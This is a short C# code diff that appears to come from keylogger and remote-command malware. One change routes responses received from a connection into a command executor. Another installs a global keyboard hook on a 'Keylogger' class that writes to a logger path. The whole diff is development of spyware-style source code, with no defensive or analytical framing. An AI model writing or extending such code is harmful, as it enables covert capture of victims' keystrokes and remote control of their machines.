@@ -48,7 +48,13 @@ namespace Server
                     {
                         try
                         {
-                            _connection.ReceiveInformation();
+                            _connection.ReceiveInformation((response, command) =>
+                            {
+
+
+                                // Detect command
+                                command.UseCommand(response);
+                            });
                         }
                         catch (Exception ex)
                         {
@@ -80,10 +86,7 @@ namespace Server
 
             using (var keylogger = new Keylogger(_environmentConfiguration.LoggerPath))
             {
-                keylogger.CreateKeyboardHook((character) =>
-                {
-                    // Log
-                });
+                keylogger.CreateKeyboardHook();
 
                 Application.Run();
             }
